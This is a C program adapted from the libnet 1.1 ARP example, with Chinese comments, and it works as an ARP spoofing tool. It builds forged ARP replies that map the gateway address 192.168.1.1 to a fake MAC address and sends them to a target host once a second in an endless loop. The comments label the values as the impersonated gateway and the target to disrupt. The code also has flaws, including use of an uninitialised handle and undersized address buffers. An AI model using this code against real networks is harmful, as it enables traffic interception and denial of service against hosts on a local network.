/*
 *  $Id: arp.c,v 1.6 2004/03/01 20:26:12 mike Exp $
 *
 *  libnet 1.1
 *  Build an ARP packet
 *
 *  Copyright (c) 1998 - 2004 Mike D. Schiffman <mike@infonexus.com>
 *  All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */

// #if (HAVE_CONFIG_H)
// #if ((_WIN32) && !(__CYGWIN__)) 
// #include "../include/win32/config.h"
// #else
// #include "../include/config.h"
// #endif
// #endif
// #include "./libnet_test.h"
#include <libnet.h>

int
main(int argc, char *argv[])
{
    int c;
    u_int32_t i;
    libnet_t *l;
    libnet_ptag_t t;
    char *device = "en0";
    u_int8_t *packet;
    u_int32_t packet_s;
    char errbuf[LIBNET_ERRBUF_SIZE];
    u_int8_t src_ip_str[12] = "192.168.1.1";        /* 冒充的网关IP */
    u_int8_t dst_ip_str[12] = "192.168.1.9";        /* 干扰的目标IP */
    u_int8_t src_mac[6] = {0x00, 0x0c, 0x29, 0x73, 0xfa, 0x11};/* 虚假的源MAC */
    u_int8_t dst_mac[6] = {0x22, 0x22, 0x22, 0x22, 0x22, 0x22};/* 干扰的目标MAC */

    u_int32_t dst_ip, src_ip;
    /* 把目的IP地址字符串转化成网络序 */
    dst_ip = libnet_name2addr4(l, dst_ip_str, LIBNET_RESOLVE);
    /* 把源IP地址字符串转化成网络序 */
    src_ip = libnet_name2addr4(l, src_ip_str, LIBNET_RESOLVE);


    // fprintf(stdout, "%d\n", sizeof(libnet_t));
    // return 0;



    printf("libnet 1.1 packet shaping: ARP[link -- autobuilding ethernet]\n"); 

    if (argc > 1)
    {
         device = argv[1];
    }

    l = libnet_init(
            LIBNET_LINK_ADV,                        /* injection type */
            device,                                 /* network interface */
            errbuf);                                /* errbuf */

    if (l == NULL)
    {
        fprintf(stderr, "%s", errbuf);
        exit(EXIT_FAILURE);
    }
    else

    /*
     *  Build the packet, remmebering that order IS important.  We must
     *  build the packet from lowest protocol type on up as it would
     *  appear on the wire.  So for our ARP packet:
     *
     *  -------------------------------------------
     *  |  Ethernet   |           ARP             |
     *  -------------------------------------------
     *         ^                     ^
     *         |------------------   |
     *  libnet_build_ethernet()--|   |
     *                               |
     *  libnet_build_arp()-----------|
     */
     
    i = libnet_get_ipaddr4(l);
  
    t = libnet_build_arp(
            ARPHRD_ETHER,                           /* hardware addr */
            ETHERTYPE_IP,                           /* protocol addr */
            6,                                      /* hardware addr size */
            4,                                      /* protocol addr size */
            ARPOP_REPLY,                            /* operation type */
            src_mac,                               /* sender hardware addr */
            (u_int8_t *)&src_ip,                         /* sender protocol addr */
            dst_mac,                               /* target hardware addr */
            (u_int8_t *)&dst_ip,                         /* target protocol addr */
            NULL,                                   /* payload */
            0,                                      /* payload size */
            l,                                      /* libnet context */
            0);                                     /* libnet id */
    if (t == -1)
    {
        fprintf(stderr, "Can't build ARP header: %s\n", libnet_geterror(l));
        goto bad;
    }

    // t = libnet_build_ethernet(
    //         dst_mac,                               /* ethernet destination */
    //         ETHERTYPE_ARP,                          /* protocol type */
    //         l);                                     /* libnet handle */


    t = libnet_build_ethernet(
        dst_mac,         /* 以太网目的地址 */
        src_mac,         /* 以太网源地址 */
        ETHERTYPE_ARP,   /* 以太网上层协议类型，此时为ARP请求 */
        0,            /* 负载，这里为空 */ 
        0,               /* 负载大小 */
        l,          /* Libnet句柄 */
        0                /* 协议块标记，0表示构造一个新的 */ 
    );



    if (t == -1)
    {
        fprintf(stderr, "Can't build ethernet header: %s\n",
                libnet_geterror(l));
        goto bad;
    }


    if (libnet_adv_cull_packet(l, &packet, &packet_s) == -1)
    {
        fprintf(stderr, "%s", libnet_geterror(l));
    }
    else
    {
        fprintf(stderr, "packet size: %d\n", packet_s);
        libnet_adv_free_packet(l, packet);
    }
    int j=10;
    while(1)
    {
        c = libnet_write(l);
        sleep(1);
    }

    if (c == -1)
    {
        fprintf(stderr, "Write error: %s\n", libnet_geterror(l));
        goto bad;
    }
    else
    {
        fprintf(stderr, "Wrote %d byte ARP packet from context \"%s\"; "
                "check the wire.\n", c, libnet_cq_getlabel(l));
    }
    libnet_destroy(l);
    return (EXIT_SUCCESS);
bad:
    libnet_destroy(l);
    return (EXIT_FAILURE);
}

/* EOF */
